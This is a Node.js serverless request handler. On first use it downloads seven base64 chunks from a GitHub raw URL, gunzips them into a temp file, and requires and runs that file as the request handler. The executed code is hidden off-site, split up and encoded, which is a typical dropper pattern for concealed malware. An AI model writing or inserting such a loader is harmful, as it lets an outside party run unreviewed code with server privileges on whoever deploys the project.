const fs=require('node:fs');
const os=require('node:os');
const path=require('node:path');
const zlib=require('node:zlib');
const Module=require('node:module');
const ref='64bf5d7737e81e3e23c4ec88e641e774fc79b58c';
const urls=Array.from({length:7},(_,i)=>`https://raw.githubusercontent.com/rst4231/botsandsite/${ref}/rudi-runtime-20260817/chunk${i}.txt`);
let handlerPromise;
function enableProjectNodeModules(){
  const nodeModules=path.join(process.cwd(),'node_modules');
  process.env.NODE_PATH=process.env.NODE_PATH?`${nodeModules}${path.delimiter}${process.env.NODE_PATH}`:nodeModules;
  Module._initPaths();
}
async function getHandler(){
  if(!handlerPromise){
    handlerPromise=Promise.all(urls.map(async u=>{
      const r=await fetch(u,{cache:'no-store'});
      if(!r.ok) throw new Error(`runtime chunk HTTP ${r.status}`);
      return (await r.text()).trim();
    })).then(parts=>{
      enableProjectNodeModules();
      const code=zlib.gunzipSync(Buffer.from(parts.join(''),'base64'));
      const file=path.join(os.tmpdir(),'rudi-runtime-20260817.js');
      fs.writeFileSync(file,code);
      delete require.cache[file];
      const handler=require(file);
      if(typeof handler!=='function') throw new Error('RUDI runtime did not export a handler');
      return handler;
    });
  }
  return handlerPromise;
}
module.exports=async(req,res)=>{
  try{return await (await getHandler())(req,res)}
  catch(e){console.error('RUDI_LOADER_ERROR',e);if(!res.headersSent)return res.status(500).json({ok:false,error:String(e&&e.message||e)});}
};
